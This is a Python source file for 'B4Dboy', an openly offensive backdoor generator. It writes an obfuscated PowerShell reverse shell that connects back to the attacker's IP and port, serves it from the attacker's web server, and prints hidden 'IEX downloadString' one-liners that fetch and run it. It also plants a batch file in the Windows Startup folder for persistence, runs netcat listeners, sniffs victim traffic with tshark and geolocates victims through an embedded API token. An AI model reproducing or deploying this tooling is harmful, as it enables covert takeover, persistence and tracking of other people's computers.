#!/bin/python3
import random as r
import subprocess
import requests
import netcat
import json
import os

def banner():
    print(Fore.MAGENTA)
    print("┏━━━━━━━━━━┓              ┏━━┓           ┏━━━━━━━━┓      ┏━━━━━━━━━━┓     ┏━━━━━━━━━━━━┓━┓     ┏━━━┓       ┏━━━┓   ")
    print("┃  ┏━━━━━┓ ┗┓            ┏┛  ┗┓          ┃ ┏━━━━┓ ┗┓     ┃  ┏━━━━━┓ ┗┓    ┃            ┃▒┃     ┗┓  ┗┓     ┏┛  ┏┛   ")
    print("┃  ┃     ┗┓ ┗┓          ┏┛    ┗┓         ┃ ┃    ┗┓ ┗┓    ┃  ┃     ┗┓ ┗┓   ┃            ┃▒┃      ┗┓  ┗┓   ┏┛  ┏┛    ")
    print("┃  ┃     ┏┛ ┏┛         ┏┛ ┏━━┓ ┗┓        ┃ ┃     ┗┓ ┗┓   ┃  ┃     ┏┛ ┏┛   ┃            ┃▒┃       ┗━┓ ┗┓ ┏┛ ┏━┛     ")
    print("┃  ┗━━━━━┛┏━┛         ┏┛ ┏┛  ┗┓ ┗┓       ┃ ┃      ┗┓ ┃   ┃  ┗━━━━━┛┏━┛    ┃         ┏┓ ┃▒┃         ┗┓ ┗━┛ ┏┛       ")
    print("┃  ┏━━━━━┓┗━┓        ┏┛  ┗━━━━┛  ┗┓      ┃ ┃      ┏┛ ┃   ┃  ┏━━━━━┓┗━┓    ┃         ┗┛ ┃▒┃          ┗┓   ┏┛        ")
    print("┃  ┃     ┗┓ ┗┓      ┏┛ ┏━━━━━━━━┓ ┗┓     ┃ ┃     ┏┛ ┏┛   ┃  ┃     ┗┓ ┗┓   ┃            ┃▒┃           ┃   ┃         ")
    print("┃  ┃     ┏┛ ┏┛     ┏┛ ┏┛        ┗┓ ┗┓    ┃ ┃    ┏┛ ┏┛    ┃  ┃     ┏┛ ┏┛   ┃            ┃▒┃           ┃   ┃         ")
    print("┃  ┗━━━━━┛ ┏┛     ┏┛ ┏┛          ┗┓ ┗┓   ┃ ┗━━━━┛ ┏┛     ┃  ┗━━━━━┛ ┏┛    ┃            ┃▒┃           ┃   ┃         ")
    print("┗━━━━━━━━━━┛      ┗━━┛            ┗━━┛   ┗━━━━━━━━┛      ┗━━━━━━━━━━┛     ┗━━━━━━━━━━━━┛━┛           ┗━━━┛         ")
    print(Fore.RESET)


# Commands
def generate_bd():
    args = action
    for arg in args:
        if "-os" in arg: osArg = arg; osT = osArg.split(osArg[3])[1]
        if "-T" in arg: timeArg = arg; timer = timeArg.split(timeArg[2])[1]
        else: timer = ""
        if "-t" in arg: typeArg = arg; type = typeArg.split(typeArg[2])[1]
        else: type = "simple"     
        if "-lip" in arg: ip = arg; ip = ip.split(ip[4])[1]
        else:
            ip = str(subprocess.check_output('ip a', shell=True)).split('\\n')
            for value in ip:
                if "/24" in value: break
            ip = value[9:][:15].split(".")

    if osT == "windows" or osT == "win":
        
        system = "Windows"

        port = r.randint(1000,65534)
        id=make_id()
        os.system(f'mkdir -p /var/www/html/b4dboy/{id}')
        payload = '$RIh2YMeUrLleflu = & (("bkJFpDG8iOerRVvo9xzsfjABHPgI5WYq4-$(0+6)h3ynN1aTEKXudm27LQlwtMCc0SUZ")[$(0-0+0-39+39+39),$(0-0+0+10),$(54),$(0-0+33),$(0+0+0-0+0-9+9+9),$(0+0+0),21,$(0-0+0+10),$($(58)),(55)] -join'+" '') $([char]($(0+6)*$(83)/$(0+6))+[char]($(46+46+0-0-46)+$(121+121+0+0-121)-$(46+46+0-0-46))+[char]($(0-0+0-0-102+102+102)*$(0-0+0+115)/$(0-0+0-0-102+102+102))+[char]($(0+0+0)+$(116)-$(0+0+0))+[char]($(0+0-0-0+3)+(((101)))-$(0+0-0-0+3))+[char]($(((28)))*(109)/$(((28))))+[char]($(1)*$(46+46+0-0-46)/$(1))+[char]($(0+0+0)+$(0-0+0-0-0+78)-$(0+0+0))+[char]($(0+0+0+19)+(((101)))-$(0+0+0+19))+[char](118+$(116)-118)+[char]($(0-0+0-39+39+39)*$(46+46+0-0-46)/$(0-0+0-39+39+39))+[char]($(0+0+0)+$(83)-$(0+0+0))+[char]($(15+15+0+0+0+0-15)*$((111))/$(15+15+0+0+0+0-15))+[char]($(11)*$(0+0+0+99)/$(11))+[char]($(0+0+0)+$(0+0-107+107+107)-$(0+0+0))+[char](24+(((101)))-24)+[char]($((75))*$(116)/$((75)))+[char]($(60)*$(0-0+0+115)/$(60))+[char]($(0+0+0)+$(46+46+0-0-46)-$(0+0+0))+[char]($(0+0+0)+84-$(0+0+0))+[char]($(0+0+0)+$($($(67)))-$(0+0+0))+[char]($($(100))+80-$($(100)))+[char]($(0-0-0-5+5+5)+$($($(67)))-$(0-0-0-5+5+5))+[char]($(0+0+0+19)*$(108)/$(0+0+0+19))+[char]($(94+94+0-0+0-94)+(($(105)))-$(94+94+0-0+0-94))+[char]($(0+0+0+0+113)+(((101)))-$(0+0+0+0+113))+[char]($(108)+110-$(108))+[char]($(0+0+0)+$(116)-$(0+0+0)))"+'("Eztpe9HAJhx0CsSoVdQai.inkFe35GxjHEZugbD17Ur.fLgCcGp4z.H2RDbaXwLSUzI46Oo8xA".replace'+"('fLgCcGp4z',"+ip[2]+").replace('Eztpe9HAJhx0CsSoVdQai',"+ip[0]+").replace('inkFe35GxjHEZugbD17Ur',"+ip[1]+").replace('H2RDbaXwLSUzI46Oo8xA',"+ip[3]+"),"+str(port)+");$VQzo0MZvYst = (& ("+'("Kq6lEhs17kBIGeSjvXwAr4cYnfT5WLPRxOyZQd8U-b9omziMCgu3J0FpVaHDN2t")[$(46+46+0-0-46),24,$(0-0+0+16),$(43),$(0+0+0-0+0-9+9+9),(13),(($(40))),(13),$(32+32+0+0-32),(55),$(20),(13),$(0+6),$(0+6),$(46+46+0-0-46),$(43),24] -join'+" '') ([string]::join('', ( (36,$(82),73,$(104),(((50))),$(0+0+89),$(77),(((101))),(($(85))),$(0+0-0+114),$(0-0+76),$(108),(((101))),$(0-0+0-0-102+102+102),$(108),$(117+117+0+0-0+0-117),$(46+46+0-0-46),$(71),(((101))),$(116),$(83),$(116),$(0+0-0+114),(((101))),$((97)),(109),(($(40))),41) |%{ ( [char][int] $_)})) | % {$_}));[byte[]]$aKydB9RXv2thuU = $(0+0+0)..$($($(65535)))|<##>%{<#$(0+0-0-0+3)GT4BWEX1Kon2#>$_}|& ("+'("NAMCqn9H23mOzfrZeP461KyWULshapxR-jIJviEo0kQtFDlGwuST7dBcVbYg8X5")[(44),$(0-0+0-39+39+39),$(14),(((38))),$(((28))),(55),$(27+27+0+0+0-27),$(32+32+0+0-32),$(11),($((57))),$(0-0+33),$(0-0+0+16),(55),$(43)] -join'+" ''){$(0+0+0)};while(($cvB4PPcLVI = $VQzo0MZvYst.Read($aKydB9RXv2thuU, $(0+0+0), $aKydB9RXv2thuU.Length)) -ne $(0+0+0)){;$WcDamZqInJS7HDr3 = (& ("+'("bkJFpDG8iOerRVvo9xzsfjABHPgI5WYq4-$(0+6)h3ynN1aTEKXudm27LQlwtMCc0SUZ")[$(0-0+0-39+39+39),$(0-0+0+10),$(54),$(0-0+33),$(0+0+0-0+0-9+9+9),$(0+0+0),21,$(0-0+0+10),$($(58)),(55)] -join'+" '') -TypeName $([char]($(116)+$(83)-$(116))+[char]($(0+0+0)+$(121+121+0+0-121)-$(0+0+0))+[char]((($(85)))*$(0-0+0+115)/(($(85))))+[char]($(0+0+52)+$(116)-$(0+0+52))+[char]($(43)+(((101)))-$(43))+[char]($(14)+(109)-$(14))+[char](24+$(46+46+0-0-46)-24)+[char]($(0+0+0)+84-$(0+0+0))+[char]($(0+0+0)+(((101)))-$(0+0+0))+[char]($(0+0+0)+$(0-120+120+120)-$(0+0+0))+[char](24+$(116)-24)+[char](($((57)))+$(46+46+0-0-46)-($((57))))+[char]($(0+0+0)+((65))-$(0+0+0))+[char]($(121+121+0+0-121)+$(83)-$(121+121+0+0-121))+[char]($(0+0+0)+$($($(67)))-$(0+0+0))+[char]($(0+0-0+47)*73/$(0+0-0+47))+[char]($((75))+73-$((75)))+[char]($(0+0-0-0+3)*69/$(0+0-0-0+3))+[char]($(0+0-0-0+3)*110/$(0+0-0-0+3))+[char]($(0+0+0)+$(0+0+0+99)-$(0+0+0))+[char]($(94+94+0-0+0-94)*$((111))/$(94+94+0-0+0-94))+[char]((109)*$($(100))/(109))+[char]($(0+0+0)+(($(105)))-$(0+0+0))+[char](((61))+110-((61)))+[char]($(23+23+0+0+0-0-23)+$(0+0-0+0-103+103+103)-$(23+23+0+0+0-0-23)))).GetString($aKydB9RXv2thuU,$(0+0+0), $cvB4PPcLVI);$FP8DpgPcK0IovuDHPZ4p = (& ("+'("jc79lahBD50zmLSoGOAWJ6bEVTCZn-gfHRqQIs83k1KMyvYi2UPxdwFrptueX4N")[36,$(((28))),$(($(45))),$(15+15+0+0+0+0-15),(($(40))),$(0+0-0-0+59),$(29),$(23+23+0+0+0-0-23),($(51)),($($(56))),(55),$(0+0-0-0+59),$((37)),$((37)),$(0+0-0+47),$(15+15+0+0+0+0-15),$(((28)))] -join'+" '') $WcDamZqInJS7HDr3 2>&1 |<##>%{<#c8jKdSaJDXH#>$_}| & ("+'("r2-$(0-0-0-5+5+5)kGjMq4wbPSpReXc3861oBCfYULI0nEhaTvylDxHWuzVJsA79igmtNKdFOQZ")[$(60),(44),(55),$(0-0+2),(13),(55),$(0+0+0),$(0+0+52),$(32+32+0+0-32),$(53+53+0-53)] -join'+" '') );$FP8DpgPcK0IovuDHPZ4p2 = $FP8DpgPcK0IovuDHPZ4p + 'P'+'S'+' ' + (& ("+'("Xm965ksBJzH0P4Tx3fq-uV2YDWvw1pGA8OQdEoUiZyIKRbL7tMjNnerlacgCFhS")[$($(30)),$(53+53+0-53),$(0+48),$(0+0+0+19),$(46+46+0-0-46),$((37)),($((57))),($($(56))),$(0+48),$(0-0+0-39+39+39),$((37)),$(0+0+52)] -join'+" '')).Path + $('>'+' ');$6j = ([text.encoding]::ASCII).GetBytes($FP8DpgPcK0IovuDHPZ4p2);$VQzo0MZvYst.Write($6j,$(0+0+0),$6j.Length);& ("+'("kOlASeNV-$(0+0+0-0+0-9+9+9)oIy0izxUGYCWLq1Bm7EuH3dK6rjPc8shnJMtwQR45XTpbfDFaZ2gv")[$(14),$(0+0-0-0+0-42+42+42),$(0+0+0+62),$(0-0+0+10),$(0+0+0),$(0-0-0-5+5+5),(8),$(0-0-0-5+5+5),$(0-0+0+16),$(53+53+0-53),35,$(0-0-0-5+5+5),(($(40))),(($(40))),$(14),$(0-0+0+10),$(0+0-0-0+0-42+42+42)] -join'+" '') ([string]::join('', ( (36,$(86),$(81+81+0+0-81),$(122),$((111)),$(0+48),$(77),$(((90))),118,$(0+0+89),$(0-0+0+115),$(116),$(46+46+0-0-46),$($(70)),$(108),$(117+117+0+0-0+0-117),$(0-0+0+115),$(104),(($(40))),41) |%{ ( [char][int] $_)})) | % {$_})};& ("+'("$(0-0-0-5+5+5)h7KWXyczN0sentgPElZ-QviSjuR9L1mdf3pDVTUo8Gqk4CYrHxBA2baIw6MFOJ")[$(23+23+0+0+0-0-23),(13),$($($(22))),(($(40))),(44),12,$(20),12,(((50))),35,$(0+48),12,$(11),$(11),$(23+23+0+0+0-0-23),(($(40))),(13)] -join'+" '') ([string]::join('', ( (36,$(82),73,$(104),(((50))),$(0+0+89),$(77),(((101))),(($(85))),$(0+0-0+114),$(0-0+76),$(108),(((101))),$(0-0+0-0-102+102+102),$(108),$(117+117+0+0-0+0-117),$(46+46+0-0-46),$($($(67))),$(108),$((111)),$(0-0+0+115),(((101))),(($(40))),41) |%{ ( [char][int] $_)})) | % {$_})"
        
        with open(f"/var/www/html/b4dboy/{id}/ps.ps1","w") as bdF: bdF.write(payload); bdF.close()  # Primary payload Maker

        tempPayload = 'function loop {\n    powershell -W hidden -c "IEX(New-Object Net.WebClient).downloadString'+"('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/ps.ps1'"+')"\n    Start-Sleep -Seconds 30\n    loop\n}\nloop'
        os.system("echo "+'"IEX(New-Object Net.WebClient).downloadString'+"('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/temp.ps1'"+')" '+"> /var/www/html/b4dboy/"+id+"/evoke.txt")  # Payload executed on Startup (Evoke.txt) Maker
        with open(f"/var/www/html/b4dboy/{id}/temp.ps1","w") as tpF: tpF.write(tempPayload); tpF.close()  # Loop request (temp.ps1) Maker
        os.system(f'sudo cp payloads/win/converted.txt /var/www/html/b4dboy/{id}') # Bb.bat / ejecuter on start
        with open(f"/var/www/html/b4dboy/{id}/infect.ps1", "w") as ifc:
            ifc.write("cd $ENV:AppData\Microsoft\Windows\ ; cd 'Start Menu' ; cd Programs\Startup; wget http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/converted.txt -o Bb.bat")
            ifc.write("\ncd $ENV:AppData\Microsoft\Windows\ ; cd 'Start Menu' ; cd Programs; curl.exe http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/evoke.txt > evoke.txt")
            ifc.write('\npowershell -W hidden -c "IEX(New-Object Net.WebClient).downloadString'+"('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/temp.ps1'"+')"')
        ifc.close()
                
        payloadS = 'powershell -W hidden -c "'+"IEX(New-Object Net.WebClient).downloadString('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/ps.ps1')"+'"'
        payloadT = 'powershell -W hidden -c "'+"IEX(New-Object Net.WebClient).downloadString('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/infect.ps1')"+'"'

        ip = f"{ip[0]}.{ip[1]}.{ip[2]}.{ip[3]}"
        if timer == "start":
            print("\nPayload for Powershell : "+payloadS+"\n Waiting for connection on port : "+str(port)); os.system(f'{config["nportg"]} -lp '+str(port)); del_ver = input("you want del session?[Y/n]")
            if del_ver != "n" and del_ver != "N": os.system(f'rm -rf /var/www/html/b4dboy/{id}')
        elif timer == "store": print("\nPayload for Powershell : "+payloadT+"\n(for listen : start -s="+id+")"); input("[!] Press enter for start scanning (just )"); store_session(id, system, get_ip(ip), str(port), "", "")
        else: print("\nPayload for Powershell (listen just after execution) : "+payloadS+"\nPayload for Powershell (store session) : "+payloadT+"\n(for listen in case of store session : start -s="+id+")"); store_session(id, system, get_ip(ip), str(port), "", "")
    
    elif osT == "linux":
        system = "Linux"
        port = r.randint(1000,65534)
        payload = ''

def gen_pld():
    ip = str(subprocess.check_output('ip a', shell=True)).split('\\n')
    for value in ip:
        if "/24" in value: break
    ip = value[9:][:12].split(".")

    args = action
    for arg in args:
        if "-ip" in arg:
            print('powershell -W hidden -c "'+"IEX(New-Object Net.WebClient).downloadString('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/payloads/ip.ps1')"+'"')
        elif "-os" in arg:
            print('powershell -W hidden -c "'+"IEX(New-Object Net.WebClient).downloadString('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/payloads/os.ps1')"+'"')
 
def mod_log():
    args = action
    for arg in args:
        if "-m" in arg:
            if "--mod" in arg:  id = arg.split(arg[5])[1].split("=")[0]
            else: id = arg.split(arg[2])[1].split("=")[0]
            for pars in range(2, len(args)):
                print(pars)
                if "=" in args[pars]: field = args[pars].split('=')[0]; value = args[pars].split('=')[1]
                elif ":" in args[pars]: field = args[pars].split(':')[0]; value = args[pars].split(':')[1]
                else: print("Unexpected value in : "+args[pars])
                with open("logs/sessions.json", "r") as sesF:
                    sessData = sesF.read()
                    lista = sessData.replace("[","").replace("]","").replace(",{",",{{").split(",{")
                    sessData = []
                    for arg in lista:
                        sessData.append(json.loads(arg))
                    for sess in sessData:
                        if sess['sess_id'] == id:
                            remove_session(id)
                            if field == "os": store_session(sess['sess_id'], value, sess['ip'], sess['port'], sess['system'], sess['pubip'])
                            elif field == "ip": store_session(sess['sess_id'], sess['os'], value, sess['port'], sess['system'], sess['pubip'])
                            elif field == "port": store_session(sess['sess_id'], sess['os'], sess['ip'], value, sess['system'], sess['pubip'])
                            elif field == "system": store_session(sess['sess_id'], sess['os'], sess['ip'], sess['port'], value, sess['pubip'])
                            elif field == "pubip": store_session(sess['sess_id'], sess['os'], sess['ip'], sess['port'], sess['system'], value)
                            else: print("[-] Err : field on sessions data don´t exist. Please read the README.md for more info.")
                        os.system('clear')
                        banner()
                        print(f"[+] {field} updated successfully")
        elif "-r" in arg:
            if "--remove" in arg: id = arg.split(arg[8])[1]
            else: id = arg.split(arg[2])[1]
            remove_session(id)
        elif "-gc" in arg:
            if "--geo" in arg: id = arg.split(arg[5])[1]
            else: id = arg.split(arg[3])[1]
            pars = args[args.index(arg)+1]
            pubip = pars.split(pars[2])[1]
            r = requests.get("https://www.ipinfo.io/"+pubip+"?token=a70e36470018f5")
            data = json.loads(r.text)
            with open("logs/geo.json", "r") as geoF: dato = geoF.read(); geoF.close()
            if dato != "" : 
                with open("logs/geo.json", "w") as geoF: geoF.write(dato[:-1]+',{\n    "sess_id":"'+id+'",\n    "country":"'+data["timezone"].split('/')[1]+'",\n    "iso":"'+data["country"]+'",\n    "latitude":"'+data["loc"].split(",")[0]+'",\n    "longitude":"'+data["loc"].split(",")[1]+'"\n}\n]'); geoF.close()
            else : 
                with open("logs/geo.json", "w") as geoF: geoF.write('[\n{\n    "sess_id":"'+id+'",\n    "country":"'+data["timezone"].split('/')[1]+'",\n    "iso":"'+data["country"]+'",\n    "latitude":"'+data["loc"].split(",")[0]+'",\n    "longitude":"'+data["loc"].split(",")[1]+'"\n}\n]'); geoF.close()
        elif "-gm" in arg:
            if "--geo-mod" in arg: id = arg.split(arg[9])[1]
            else: id = arg.split(arg[3])[1]
            Nid = args[args.index(arg)+1]
            remove_geo(id)
            with open("logs/geo.json", "r") as gFOld: oldData = gFOld.read(); gFOld.close()
            with open("logs/geo.json", "w") as geoF: geoF.write(oldData[:-1]+'[\n{\n    "sess_id":"'+Nid+'",\n    "country":"'+data["timezone"].split('/')[1]+'",\n    "iso":"'+data["country"]+'",\n    "latitude":"'+data["loc"].split(",")[0]+'",\n    "longitude":"'+data["loc"].split(",")[1]+'"\n}\n]'); geoF.close()
                    
        elif "-c" in arg:
            with open("logs/sessions.json", "w") as sesF: sesF.write(""); sesF.close(); os.system('clear'); banner()
            print("[+] Data deleted successfully. ")

def start_ses():
    ses = ""
    lst = ""
    args = action
    for arg in args:
        if "--session" in arg: ses = arg.split(arg[9])[1]
        elif "-s" in arg: ses = arg.split(arg[2])[1]
        if "--listen" in arg: lst = arg.split(arg[8])[1]
        elif "-l" in arg: lst = arg.split(arg[2])[1]
    if ses != "":
        with open("logs/sessions.json", "r") as sesF:
            sessData = sesF.read()
            lista = sessData.replace("[","").replace("]","").replace(",{",",{{").split(",{")
            sessData = []
            for arg in lista:
                sessData.append(json.loads(arg))
            for sess in sessData:
                if ses == sess['sess_id']: port = sess['port']
        print("Waiting for connections on : "+port+"...  ¡This action may take 5 min!")
        os.system(f'{config["nportg"]} -lp '+port)
    elif lst != "":
        print("Waiting for connections on : "+lst)
        os.system(f'{config["nportg"]} -lp '+lst)
    else:
        print("[-] Err : No Parameter given ")

def show_info():
    if action[1] == "-s" or action[1] == "--sessions":
        with open("logs/sessions.json", "r") as sesF:
            sessData = sesF.read()
            if sessData != "":
                sessLen = sessData.count("{")+sessData.count("}")
                sessLen = int(sessLen/2)

                lista = sessData.replace("[","").replace("]","").replace(",{",",{{").split(",{")
                sessData= []
                for arg in lista:
                    sessData.append(json.loads(arg))
                print("Session ID     Os Type      Local IP      Port    |      Specific Os           Public Ip")
                print("- - - - -      - - - -    - - - - - -     - - -        - - - - - - - -      - - - - - - - -")
                for session in range(0, sessLen):
                    session = sessData[session]
                    if session['system'] == "" and session['pubip'] == "": print(f"{session['sess_id']}      {session['os']}    {session['ip']}    {session['port']}        Null                Null")
                    elif session['pubip'] == "": print(f"{session['sess_id']}      {session['os']}    {session['ip']}    {session['port']}        {session['system']}     Null")
                    elif session['system'] == "": print(f"{session['sess_id']}      {session['os']}    {session['ip']}    {session['port']}        Null                 {session['pubip']}")
                    else: print(f"{session['sess_id']}      {session['os']}    {session['ip']}    {session['port']}        {session['system']}      {session['pubip']}")
            else:
                print("[-] Err : No sessions stored.")
        sesF.close()
    elif action[1] == "-g" or action[1] == "--geo":
        print("[-] Geolocalization will be available soon")
    elif action[1] == "-c" or action[1] == "--config":
        print("Config Values :")
        print("Interface : "+config["interface"])
        print("Packages : "+config["packages"])
        print("Token : "+config["token"])
        print("Dictionary : "+config["dictionary"])
    else: print("[-] Err: Parameter missing.")

def mod_config(args):
    for arg in args:
        with open(".config.json", "r") as configF:
            conf = json.loads(configF.read())
        configF.close()
        if "-i" in arg:
            if "--interface" in arg: interface = arg.split(arg[11])[1]
            else: interface = arg.split(arg[2])[1]
            with open(".config.json", "w") as confF: confF.write('{\n    "interface":"'+interface+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "path":"'+conf["path"]+'"\n}'); confF.close()
        if "-p" in arg:
            if "--packages" in arg: packages = arg.split(arg[10])[1]
            else: packages = arg.split(arg[2])[1]
            with open(".config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+packages+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "path":"'+conf["path"]+'"\n}'); confF.close()
        if "-t" in arg:
            if "--token" in arg: token = arg.split(arg[7])[1]
            else: token = arg.split(arg[2])[1]
            with open(".config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+token+'",\n    "dictionary":"'+conf["dictionary"]+'",\n    "path":"'+conf["path"]+'"\n}'); confF.close()
        if "-d" in arg:
            if "--dictionary" in arg: dictionary = arg.split(arg[13])[1]
            else: dictionary = arg.split(arg[2])[1]
            with open(".config.json", "w") as confF: confF.write('{\n    "interface":"'+conf["interface"]+'",\n    "packages":"'+conf["packages"]+'",\n    "token":"'+conf["token"]+'",\n    "dictionary":"'+dictionary+'",\n    "path":"'+conf["path"]+'"\n}'); confF.close()
    print("[+] Config updated succesfully")

def help_panel():
    print("Commands : \n")
    print("generate/gen\n      -os                 This designate operating system of the victim machine : windows/linux\n      -lip                This parameter set attacker ip manually : 10.0.0.15\n      -t                  This designate the type of attack : simple/global  ¡¡global tokens are avaible on our discord server!!\n      -T                  If want start listen just after of execution or want store session : start/store\n")
    print("payloads/pay\n      -ip                 Send request using api's for get public ip and geolocation of victim machine\n      -os                 Obtain system information")
    print("log\n      -m/--mod            Modify data stored from sessions : -m:<id> ip=10.0.0.2\n      -r/--remove         Remove specified session from log : -r=<id>\n      -c/--clean          Delete all data from sessions log\n      -gc/--geo            create geolocation log : -gc=<id> ip:<public ip>\n      -gm/--geo-mod       Modify geolocation data of a session")
    print("start\n      -s/--session        Use for start a stored session using id : -s:<id>\n      -l/--listen         Use for start listen on a port : -l=2925\n")
    print("show\n      -s/--sessions       Show all sessions stored\n      -g/--geo            Show geographic information about sessions\n      -c/--config         Use for display config\n")
    print("config\n      -i/--interface      Config network interface\n      -p/--packages       Config the amount of packages received\n      -t/--token          Set or add token of ngrok\n      -d/--dictionary     Modify the parameters for create session id\n")

# Functions
def setup():
    with open(".config.json", "r") as cFile: config = json.loads(cFile.read()); cFile.close()
    # Config
    if config["interface"] == "": print("Please configure interface :config -i=interface")
    # Programs
    apps = []
    print("[!] Installing Thsark.."); apps.append('tshark')if str(subprocess.check_output("tshark -c 0&", shell=True)) == "127" else print("[+] Tshark is instaled")
    print(f'[!] Installing {config["nportg"]}.') if str(subprocess.check_output(config["nportg"]+' localhost &', shell=True)) == "127" else print(f'[+] {config["nportg"]} is instaled')
    for i in apps: os.system(f'sudo apt install {i}')
    banner()
    # Services
    out = str(subprocess.check_output("ps aux | grep apache2", shell=True))
    if "www-data" not in out: os.system('service apache2 start'); print("[*] Apache Server is Started.")
    else: print("[*] Apache server is start")
    if not os.path.exists("/root/.config/ngrok/ngrok.yml"):
        if config["token"] != "": print("[*] Configurando ngrok..."); os.system(f'wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz -O /root/ngrok.tgz -o /root/out && rm /root/out && tar -xf /root/ngrok.tgz && chmod +x /root/ngrok && /root/./ngrok config add-authtoken {config["token"]}'); print("[+] Ngrok configured succesfully")
        else: print("[!] Ngrok not configured")
    else: print("[*] Ngrok is active") 

def make_id():
    id = ""
    dictionary = config['dictionary']
    for a in range(0, 9):
        id = id+(dictionary[r.randint(0, len(dictionary)-1)])
    return id

def get_ip(ip):
    ipSrc = ""
    os.system('tshark -i '+config['interface']+' -f "host '+ip+'" -c '+config['packages']+' -Ttext > ipOut.txt')
    with open("ipOut.txt", "r") as ipF:
        data = ipF.read()
    ipF.close()
    data = data.split('\n ')
    for line in data:
        if "GET" in line:
            ipSrc = line[3:].split(' ')[2]
    if ipSrc != "": return ipSrc
    else: os.system('clear'); banner(); get_ip(ip)
    os.system('rm -rf ipOut.txt')

def store_session(id, osT, ip, port, system, pubip):
    with open("logs/sessions.json", "r") as oldSes:
        oldData = oldSes.read()
    oldSes.close()
    with open("logs/sessions.json", "w") as sesF:
        if oldData != "": sesF.write(f"{oldData[:-1]},"); sesF.write('{\n    "sess_id":"'+id+'",\n    "os":"'+osT+'",\n    "ip":"'+ip+'",\n    "port":"'+port+'",\n    "system":"'+system+'",\n    "pubip":"'+pubip+'"\n}\n]')
        else: sesF.write('[\n{\n    "sess_id":"'+id+'",\n    "os":"'+osT+'",\n    "ip":"'+ip+'",\n    "port":"'+port+'",\n    "system":"'+system+'",\n    "pubip":"'+pubip+'"\n}\n]')
    sesF.close()
    os.system('clear')
    banner()
    print("[+] Session stored successfully")

def remove_session(id):
    with open("logs/sessions.json", "r") as sesF:
        sessData = sesF.read()
        lista = sessData.replace("[","").replace("]","").replace(",{",",{{").split(",{")
        sessData = []
        for arg in lista:
            sessData.append(json.loads(arg))
        for session in sessData:
            if id == session['sess_id']:
                sessData.remove(session)
    sesF.close()
    with open("logs/sessions.json", "w") as sesF: sesF.write(""); sesF.close()
    for sess in sessData:
        store_session(sess['sess_id'], sess['os'], sess['ip'], sess['port'], sess['system'], sess['pubip'])
    os.system('clear')
    banner()
    print("[+] Session removed successfully")

def remove_geo(id):
    with open("logs/geo.json", "r") as sesF:
        sessData = sesF.read()
        lista = sessData.replace("[","").replace("]","").split(",")
        sessData = []
        print(lista)
        for arg in lista:
            sessData.append(json.loads(arg))
        for session in sessData:
            if id == session['sess_id']:
                sessData.remove(session)
    sesF.close()
    with open("logs/geo.json", "w") as sesF:
        for sess in sessData:
            sesF.write('\n{\n    "sess_id":"'+sess["sess_id"]+'",\n    "country":"'+sess["country"]+'",\n    "iso":"'+sess["iso"]+'",\n    "latitude":"'+sess["latitude"]+'",\n    "longitude":"'+sess["longitude"]+'"\n}')
            if sessData.index(sess) == len(sessData): sesF.write("\n]")
            else: sesF.write("\n,")
    sesF.close()
    os.system('clear')
    banner()
    print("[+] Session removed successfully")

# Interpreter
banner()
setup()
while True:
    with open(".config.json", "r") as cFile:
        config = json.loads(cFile.read())
    try:
        action = input("B4Dboy > ").split(' ')
        if action[0] != "":
            if action[0] == "close" or action[0] == "bye":
                close_vrf = input("\nQuiere salir del programa? [Y/n] > ")
                if close_vrf != "n" and close_vrf != "N":
                    print("Saliendo ...")
                    os.system("service apache2 stop")
                    os.system('clear')
                    exit()
            elif action[0] == "h" or action[0] == "help":
                help_panel()
            elif action[0] == "gen" or action[0] == "generate":
                if len(action) > 1: generate_bd()
                else: print("[-] Parameter Missing. Use h or help for help panel")
            elif action[0] == "log":
                if len(action) > 1: mod_log()
                else: print("[-] Parameter Missing. Use h or help for help panel")
            elif action[0] == "start":
                if len(action) > 1: start_ses()
                else: print("[-] Parameter Missing. Use h or help for help panel")
            elif action[0] == "show":
                if len(action) > 1: show_info()
                else: print("[-] Parameter Missing. Use h or help for help panel")
            elif action[0] == "config":
                if len(action) > 1 and action[1] !="" : mod_config(action)
                else: print("[-] Parameter Missing. Use h or help for help panel")
            elif action[0] == "clear":
                os.system('clear'); banner()
            elif action[0] == "rem":
                remove_geo("123")
    except KeyboardInterrupt:
        close_vrf = input("\nQuiere salir del programa? [Y/n] > ")
        if close_vrf != "n" and close_vrf != "N":
            print("Saliendo ...")
            os.system("service apache2 stop")
            os.system('clear')
            exit()
